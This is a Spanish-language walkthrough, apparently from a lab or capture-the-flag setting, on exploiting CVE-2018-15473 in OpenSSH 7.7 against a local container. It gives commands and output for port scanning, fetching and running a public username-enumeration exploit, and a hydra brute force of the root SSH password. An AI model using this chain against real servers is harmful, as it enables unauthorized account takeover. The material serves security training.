# Vulnerabilidad CVE-2018-15473  
<p>Esta vulnerabilidad de la version 7.7. de OPenSSH se produce durante la autenticación porque cuando se esta realizando la autenticación
el sistema primero verifica el usuario si existe o no antes de comprobar el formato de lo que esta escrito, si el usuario no existe saltará el error " SSH2_MSG_USERAUTH_FAILURE " y posteriormente verificará si el formato es correcto, debido a esto se puede comprobar si el usuario
existe o no.</p>

## Requisitos
- nmap
- ssh
- hydra
- searchsploit
- python

## Exploit
<p>Realizar un escaneo de puertos con nmap</p>

```
nmap -sCV -sS -n -Pn -p- [IP]

```

<p>Esto nos ayudará a escanear los puertos de las IP que esten en nuestra red obteniendo el siguiente resultado<br></p>

```
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)

```

<p>Vemos que tenemos abierto el puerto 22/tcp con un servicio ssh y una version de OpenSSH 7.7,
lo siguiente que debemos hacer es ver que tipo de vulnerabilidades tiene esta version con el siguiente comando</p>

```
searchsploit OpenSSH

```
<p>Esta herramienta nos ayudara a ver que vulnerabilidades tiene esta version, dando como resultado algo similar a esto</p>

```
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Es | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of S | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution             | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read       | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow           | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                   | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)               | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One            | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow   | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)         | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)         | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service   | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation         | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                         | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                 | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                       | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded  | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                         | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                   | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident          | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool            | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                        | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack         | multiple/remote/3303.sh
------------------------------------------------------------- ---------------------------------

```

<p> Una vez que hayamos encontrado el exploit de nuestra version procedemos a descargarlo en nuestro directorio</p>

```
searchsploit -m linux/remote/45939

```

<p>Usamos el exploit que se encuentra en nuestro directorio y probaremos con algun nombre de usuario comun como "root"</p>

```
python2 45939 IP root

```

<p>Dandonos un resultado similar a esto, en donde verifica que root es un usuario</p>

```
└─$ python2 45939.py 172.17.0.2 root
/home/kali/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] root is a valid username

```

<p> Ahora usamos a hydra para hacer un ataque de fuerza bruta al usuario root</p>

```
hydra -l root -P UBICACION_DE_DICCIONARIO ssh:// IP

```

<p>Finalmente obtenemos la contraseña del usuario root</p>

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-01 20:05:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-01 20:05:42

```


